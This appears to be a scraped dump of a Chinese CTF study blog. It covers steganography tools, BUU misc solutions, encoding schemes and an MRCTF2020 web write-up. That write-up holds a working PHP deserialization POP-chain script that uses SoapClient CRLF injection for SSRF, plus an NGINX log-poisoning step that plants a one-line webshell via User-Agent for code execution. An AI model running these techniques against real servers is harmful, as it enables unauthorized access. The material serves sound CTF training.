难一点的题目则是对音频进行频谱分析，比如这篇文章https://blog.csdn.net/vhkjhwbs/article/details/103036133谈到的lookme和用眼睛去倾听这两道题。 MP3Stego 如果mp3 文件听上去没有什么奇怪的地方，那么就试试用这个工具。教程：https://blog.csdn.net/myloveprogrmming/article/details/52641916 用这个工具会输入密码，有时候题目没有特别提示就可以试试弱口令，有时候甚至就是题目名字。 2.针对wav文件的隐写工具：silenteye 将文件拖到里面点击decode 简单的题目此时再点右下角的decode就能出结果，稍微绕点的就还需要勾选这里输入密码，或者选择正确的type，看出题人的心思了~ 当然，这个工具还能对bmp、jpg格式的隐写文件进行解密 视频隐写1.针对mp4文件的隐写工具：ffmpeg（一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。） 详细使用教程介绍：https://blog.csdn.net/Allyli0022/article/details/78355248 一般在题目中会插入一些图片，由于一下就闪过了所以需要用这个工具按帧提取出来，简单的题目往往这样就能做出来了。 文本隐写1.word文档隐写白色文字 由于一般word文档都是白色为底色，所以如果文本字体设置的是白色，就看不出来有东西，这个时候可以试试ctrl+a，全选文字 再把颜色改成其他颜色，就能看出来被隐藏的文字了 隐藏文字选项 在文本出右键鼠标，字体选项中有一处隐藏文字选项取消勾选后被隐藏的文字就出现了 2.PDF隐写wbs43open（可用于PDF、bmp等文件的隐写） 点击continue后会出现encode和decode，解密就选decode，然后第三步就选择文件类型和文件 第四步步设置密码，可以置空 第五步设置解密之后文件的存储路径及文件名 接下来第六步完成就行啦 要出这种类型的隐写题同样用这个工具也行。 3.html隐写即snow隐写，需要告诉key，解密网站http://fog.misty.com/perry/ccs/snow/snow/snow.html 其他类型的隐写1.base64隐写Tr0y师傅的文章讲解的很详细，在这里就不过多介绍了，请移步https://www.tr0y.wang/2017/06/14/Base64steg/ 2.零宽度字符隐写零宽度字符是一些不可见的，不可打印的字符。本文不做更多介绍，更详细的内容请移步http://www.ga1axy.top/index.php/archives/20/ 3.ntfs数据流隐写 NTFS（New Technology File System）是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件许可实现安全性，并支持跨越分区。 –《百度百科》 echo abcdefg&gt;&gt;123.txt:222.txt 该条命令创建的是单独的NTFS流文件，系统不可见的同时我们无法通过普通方法看到 此时有两种方法，一种是命令： notepad 123.txt:222.txt //这个命令只有自己已经知道NTFS流文件名的时候使用，局限性很大，同时失败几率大 另一种方法是用工具：NtfsStreamsEditor（右键以管理员身份运行） 点击快速查看 原文链接:https://www.freebuf.com/articles/others-articles/266884.html","link":"/2021/10/09/misc%E5%85%A5%E9%97%A8/"},{"title":"MRCTF2020","text":"[MRCTF2020]Ezpop_Revengewww.zip源码泄露，下载下来审计一下，有一个flag.php，看起来是需要SSRF漏洞的因为需要你访问的来源是127.0.0.1 &lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ $_SESSION['flag']= &quot;MRCTF{******}&quot;;}else echo &quot;我扌your problem?\\nonly localhost can get flag!&quot;;?&gt; 毕竟是框架题，看了一下，应该是要反序列化找ssrf的漏洞的位点然后去打，全局搜索一下反序列化函数，可以发现，我们传入的coincidence[‘hello’], $this-&gt;coincidence[‘world’]会被分为两个部分传入Typecho_Db &lt;?phpclass HelloWorld_DB{ private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }}class HelloWorld_Plugin implements Typecho_Plugin_Interface{public function action(){ if(!isset($_SESSION)) session_start(); if(isset($_REQUEST['admin'])) var_dump($_SESSION); if (isset($_POST['C0incid3nc3'])) { if(preg_match(&quot;/file|assert|eval|[`\\'~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo &quot;Not that easy.&quot;; } } } } ?&gt; 传入之后，在这里进行进行了一个拼接,并在最后实例化了这个类,可以看到这里提示了一个tostring方法，所以我们就去找找Typecho_Db，看看是否有这个tostring方法，可以进行操作 public function __construct($adapterName, $prefix = 'typecho_') { /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = 'Typecho_Db_Adapter_' . $adapterName; if (!call_user_func(array($adapterName, 'isAvailable'))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;);//__toString() } $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName(); } 可以发现，这里有一个tostring方法可以进行操作，其实链子到这里就似乎已经断了，但是该如何实现ssrf呢？就要想到一个php的内置类soapclient，而这里有个点，_adapter-&gt;parseSelect，如果将adapter赋值为这个类，那么就会调用这个类中不存在的方法，相当于触发了其中的call函数，并且这里还有可控的参数供我们写入 class Typecho_Db_Query{ const KEYWORDS = '*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'; private static $_default = array( 'action' =&gt; NULL, 'table' =&gt; NULL, 'fields' =&gt; '*', 'join' =&gt; array(), 'where' =&gt; NULL, 'limit' =&gt; NULL, 'offset' =&gt; NULL, 'order' =&gt; NULL, 'group' =&gt; NULL, 'having' =&gt; NULL, 'rows' =&gt; array(), ); private $_adapter; private $_sqlPreBuild; private $_prefix; private $_params = array(); public function __toString() { switch ($this-&gt;_sqlPreBuild['action']) { case Typecho_Db::SELECT: return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); case Typecho_Db::INSERT: return 'INSERT INTO ' . $this-&gt;_sqlPreBuild['table'] . '(' . implode(' , ', array_keys($this-&gt;_sqlPreBuild['rows'])) . ')' . ' VALUES ' . '(' . implode(' , ', array_values($this-&gt;_sqlPreBuild['rows'])) . ')' . $this-&gt;_sqlPreBuild['limit']; case Typecho_Db::DELETE: return 'DELETE FROM ' . $this-&gt;_sqlPreBuild['table'] . $this-&gt;_sqlPreBuild['where']; case Typecho_Db::UPDATE: $columns = array(); if (isset($this-&gt;_sqlPreBuild['rows'])) { foreach ($this-&gt;_sqlPreBuild['rows'] as $key =&gt; $val) { $columns[] = &quot;$key = $val&quot;; } } return 'UPDATE ' . $this-&gt;_sqlPreBuild['table'] . ' SET ' . implode(' , ', $columns) . $this-&gt;_sqlPreBuild['where']; default: return NULL; } } 梳理一下pop链的逻辑1.HelloWorld_Plugin为pop链反序列化的入口，跳转至HelloWorld_DB类中进行Typecho_Db进行一个初始化，并通过concidence传入数值2.通过tostring跳转至Typecho_Db的tostring魔术方法中3.针对adatpter的一个调用赋值为sopa类并进行sopa类的call方法的调用，最后利用这个call方法进行一个ssrf发送报文实现flag的获取 所以初步的一个pop链就是 &lt;?phpclass HelloWorld_DB{ private $flag = &quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __construct() { $this-&gt;coincidence=array(&quot;hello&quot;=&gt;new Typecho_Db_Query()); }}class Typecho_Db_Query{ function __construct() { $this-&gt;_adapter = new SoapClient(); $this-&gt;_sqlPreBuild=array(&quot;action&quot;=&gt;&quot;SELECT&quot;); $this-&gt;_adapter=new SoapClient; }} 但是我们要将flag带出来，还需要吧自己的phpsessid传过来，然而soap并不能设置cookie，因此需要crlf，soapclient可以这只ua，只要在ua后加上\\r\\nCookie：PHPSESSID=xxx,就可以为http头添加一个新的cookie字段，这样就可以带出session了，最后就是寻找一下其中的路由即可，在/var/Typecho/Plugin.php 就有如下路由 */public static function activate($pluginName){ self::$_plugins['activated'][$pluginName] = self::$_tmp; self::$_tmp = array(); Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,'action');} 但是在后面看了题解，发现这题有一个坑，就是这里private属性不能单纯的使用%00绕过需要将其转为十六进制才行所以最终的脚本如下: &lt;?phpclass HelloWorld_DB{ private $flag = &quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __construct() { $this-&gt;coincidence=array(&quot;hello&quot;=&gt;new Typecho_Db_Query()); }}class Typecho_Db_Query{ private $_adapter; private $_sqlPreBuild; function __construct() { $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=abcd' ); $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;&quot;eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n&quot;.join(&quot;\\r\\n&quot;,$headers).&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, 'uri' =&gt; &quot;aaab&quot;)); $this-&gt;_adapter = $a; $this-&gt;_sqlPreBuild=array(&quot;action&quot;=&gt;&quot;SELECT&quot;); }}function decorate($str){ $arr = explode(':', $str); $newstr = ''; for ($i = 0; $i &lt; count($arr); $i++) { if (preg_match('/00/', $arr[$i])) { $arr[$i - 2] = preg_replace('/s/', &quot;S&quot;, $arr[$i - 2]); } } $i = 0; for (; $i &lt; count($arr) - 1; $i++) { $newstr .= $arr[$i]; $newstr .= &quot;:&quot;; } $newstr .= $arr[$i]; return $newstr;}$a = new HelloWorld_DB();$a = preg_replace(&quot; /\\^\\^/&quot;, &quot;\\r\\n&quot;, $a);$urlen = urlencode($a);$urlen = preg_replace('/%00/', '%5c%30%30', $urlen);$a = decorate(urldecode($urlen));echo base64_encode($a); 但是很奇怪，用这个生成的payload打不通，于是我们来比对看看是哪里出了问题,测试了一下，原来问题出在http头的书写过程中 $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=abcd' ); $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;&quot;eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n&quot;.join(&quot;\\r\\n&quot;,$headers).&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, 'uri' =&gt; &quot;aaab&quot;)); $this-&gt;_adapter = $a; ALL_INFO_YOU_WANT这种解法比较签到，是常规思路，这题的定位本来就是个白给的题目，所以就没改掉日志 由 http 回包 header 得知是 NGINX，直接： all_info_u_want.php?file=../../../../../var/log/nginx/access.log 但是因为 url 会被 url 编码，可以把一句话木马写在 User-Agent，另外记得一定要闭合不然 php 执行会出错，包含即可 RCE找flag新语句：通过文件内容找flag find / -name &quot;*&quot; | xargs grep &quot;flag{&quot;","link":"/2021/10/10/MRCTF2020/"},{"title":"jsp内存马","text":"","link":"/2021/10/10/jsp%E5%86%85%E5%AD%98%E5%90%97/"},{"title":"电子取证","text":"","link":"/2021/10/09/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"},{"title":"NSSCTF-phar反序列化","text":"","link":"/2021/10/13/NSSCTF-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"buu-misc","text":"忘记保存了，无语了，所以直接写一下解题思路 金三胖选择analyze的frame browser 二维码binwalk -e 1.png 只用zip密码爆破软件 N种方式解决在网页中打开（写个html代码） 大白很显然啊 图片长宽不对在010中打开 调整长高18、19位是长，22、23是宽 你竟然赶我走010中打开 搜索flag 或拉到底 基础破解 rar使用rar破解工具 LSB看到RGB中的0通道上面有一行内容 先选择analyse -&gt;data extract-&gt;save bin保存为png 扫描一下 文件中的秘密记事本打开（改后缀） zip伪加密就是这个zip zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包 一个 ZIP 文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 压缩源文件数据区： 50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 5A 7E：最后修改文件时间 F7 46：最后修改文件日期 16 B5 80 14：CRC-32校验（1480B516） 19 00 00 00：压缩后尺寸（25） 17 00 00 00：未压缩尺寸（23） 07 00：文件名长度 00 00：扩展记录长度 压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50) 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 08 00：压缩方式 5A 7E：最后修改文件时间 F7 46：最后修改文件日期 16 B5 80 14：CRC-32校验（1480B516） 19 00 00 00：压缩后尺寸（25） 17 00 00 00：未压缩尺寸（23） 07 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度 00 00：磁盘开始号 00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量 压缩源文件目录结束标志： 50 4B 05 06：目录结束标记 00 00：当前磁盘编号 00 00：目录区开始磁盘编号 01 00：本磁盘上纪录总数 01 00：目录区中纪录总数 59 00 00 00：目录区尺寸大小 3E 00 00 00：目录区对第一张磁盘的偏移量 00 00：ZIP 文件注释长度 因此，根据此题目来看： 压缩源文件数据区：50 4B 03 04：这是头文件标记然后我们直接搜索加密方式0900 说明是有加密，0800说明无加密 接下来使用其他解压软件打开就行了，这里用得是winrar 被嗅探的流量直接搜索flag就行了 镜子里的世界使用stegslove 打开，点击extract preview功能，选取最低0通道，打开即可看到flag ningen在010editor中发现信息 使用分离工具分离一下然后zip密码爆破一下 小明的保险箱 应该又是要分离一下文件，分离 以后需要密码，再回去看 发现010editor有说 escape cap追踪tcp流即可 另一个世界文件尾巴，然后二进制转字符串即可z 隐藏的钥匙图片隐写 使用010打开，直接点击搜索类型——text，然后点击搜索flag即可 FLAGsteg打开，使用bin保存，然后保存为zip，解压以后得到的文件，使用010打开，然后搜索{就可以找到flag这里说一下思路感觉没有提示，单纯让你就是硬试？所以小结一下 小结遇到图片——010editor打开试试，全局搜索flag、txt、zip等文件，如果有，就去分离，没有的话就考虑是否隐藏在LSB中，所以分离0通道导出为bin，然后尝试，也许是jpg，也许是txt，也许是zip，主要看文件头，像这题504b0304明显是zip的文件头，所以保存为zip 假如给我三天光明 下面应该是压缩包的密码，但是没看懂是干个啥 原来是盲文表。。。对照一下: kmdonowg 得到了一个音频，听起来就是个莫斯电码 -.-. - …-. .-- .–. . … ----- —… --… …-- …— …–… …— …-- -… --… flag{wpei08732?23dz} 神秘龙卷风爆破一下https://www.splitbrain.org/services/ookbrainfuck加密，解密一下: 后门查杀要我们找webshell文件，这里可以使用linux系统的查找文件内容指令，或者使用D盾，这里试一下D盾，因为D盾后续还可用于awd查找shell文件 数据包中的线索在流量包中可以看到一个很长的东西，感觉是有问题的base64解码一下，可以发现是一个JFIF文件 此网站解码可以直接转成文件https://the-x.cn/base64 荷兰宽带数据泄露RouterPassView查看后，搜索username或者password MISC 来首歌吧莫斯密码 面具下的flagbinwalk分离一下文件，可以得到一个压缩文件，zip伪加密，然后将0900改为0800 然后再linux解压这个文件 7z x flag.vmdk -o./ 找到 key_part_one 里的 NUL文件 和 key_part_two 里的 where_is_flag_part_two.txt:flag_part_two_is_here.txt注意:windows下解压不会有&lt;where_is_flag_part_two.txt:flag_part_two_is_here.txt这个文件 只有linux用命令解压才会有https://blog.csdn.net/weixin_45485719/article/details/107417878就可以发现有如下文件: 这里是解密网址: https://www.splitbrain.org/services/ook flag{N7F5_AD5_i5_funny!} 九连环010打开，发现flag.txt，然后去kali分离一下得到一个压缩包需要密码 然后又得到一张照片，，啥信息也没看到，原来是需要一个新的工具: steghide将secret.txt文件隐藏到text.jpg中：# steghide embed -cf test.jpg -ef secret.txt -p 123456从text.jpg解出secret.txt:#steghide extract -sf test.jpg -p 123456————————————————版权声明：本文为CSDN博主「Blood_Seeker」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/Blood_Seeker/article/details/81837571 小结为了校赛做了一下misc，单纯学一下基本操作:1.压缩文件:zip:考虑zip爆破，或者zip伪加密 rar:使用rar爆破密码工具2.图片——隐写：010打开，直接搜索flag、txt、jpg等，看看有没有隐藏，分离一下steg工具，lsb的0通道合成一下导出为bin 看一下文件头是个啥，保存为特定的文件就行了","link":"/2021/10/13/buu-missc/"},{"title":"crypto-古典密码","text":"","link":"/2021/10/15/crypto-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"title":"crypto-编码","text":"编码ascii码hex编码信息转为十六进制 base家族ase64 用于编码邮件内容、网页图片，意在减少传输过程中可能出现的错误；Base58 是比特币地址使用的编码方法，旨在提高地址的辨识度；Base32 用在一些对大小写不敏感的文件系统中。每种 Base-x 的编码都有适合它们的应用场景。 Base编码从底层来说就是对数据进行进制转换，Base64是64进制，Base32是32进制，Base16是16进制。而中间的过程是为了更好地进行传输数据 URL编码HTML编码Unicode编码Morse电码JSFuck只需要“()+[]!”这6个字符组成的字符串。jsfuck的编码和解码与morsecode类似，只不过其表示的是JavaScript的语句。jsfuck源于一门编程语言brainfuck，其主要的思想就是只使用8种特定的符号来编写代码。jsfuck也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是()+[]! JSFuck可以使用jsfuck官方的网站进行解密：JSFuck - Write any JavaScript with 6 Characters: !+ Quoted-Printable编码比如： 密码学 可以使用Quoted-printable编码为： =E5=AF=86=E7=A0=81=E5=AD=A6=0A=09=09=09=09=09 Quoted-printable的编码形式也比较容易辨认，基本上就是字符加等于号构成编码文段格式。 BrainFuck编码比如： Hello world! 使用BrainFuck进行编码就会得到 +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ ++.++ +++++..+++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- ----. &lt;++++ +++[- &gt;+++++++&lt;] &gt;++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ +++++ +.+++ .---- --.-- ----- -.&lt;+++++++ +[-&gt;- ----- --&lt;]&gt; ---.&lt; 可以使用Brainfuck/Ook! Obfuscation/Encoding 这个网站进行编码和解码 Ook编码Ook也是一种小型的编程语言，Ook是为红毛猩猩设计的编程语言，设计思路和BrainFuck的设计思路基本类似，但是Ook采用了更少的元素进行编程，语句更加简单。由于Ook的特点，因此Ook也可以设计为一种特殊的编码方式。 比如： Hello world! 使用Ook编码后，得到 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. 非常长，进行Ook编码和解码的网站也是Brainfuck/Ook! Obfuscation/Encoding UUencode编码比如 Hello World! 进行编码后得到： ,2&amp;5L;&amp;\\@5V]R;&amp;0A XXencode编码比如： Hello World! 进行XXencode编码后，得到 BG4JgP4wUJqxmP4EV0U++ JJencode编码算是JSFuck编码的前身，是由18种字符组成的编码格式。是针对JavaScript进行设计的编码方式。 长谷川阳介（Yosuke Hasegawa）于2009年7月创建了一个名为“jjencode”的网络应用程序，可将一切的JavaScript代码混淆为!+,”$.:;_{}~=这十八个字符的排列组合。 比如： alert(&quot;Hello, JavaScript&quot; ) 进行jjencode编码，得到 $=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\\\\&quot;\\\\&quot;+$.__$+$.__$+$.___+$.$$$_+(![]+&quot;&quot;)[$._$_]+(![]+&quot;&quot;)[$._$_]+$._$+&quot;,\\\\&quot;+$.$__+$.___+&quot;\\\\&quot;+$.__$+$.__$+$._$_+$.$_$_+&quot;\\\\&quot;+$.__$+$.$$_+$.$$_+$.$_$_+&quot;\\\\&quot;+$.__$+$._$_+$._$$+$.$$__+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+&quot;\\\\&quot;+$.__$+$.$_$+$.__$+&quot;\\\\&quot;+$.__$+$.$$_+$.___+$.__+&quot;\\\\\\&quot;\\\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\\&quot;&quot;)())(); AAencode编码aaencode编码是一个比较有意思的编码形式，同样也是对于JavaScript语言设计的编码方式，是把JavaScript的代码编码成日本的表情包。 比如： alert(&quot;Hello, JavaScript&quot;) 通过aaencode编码，得到 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\&quot;';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - 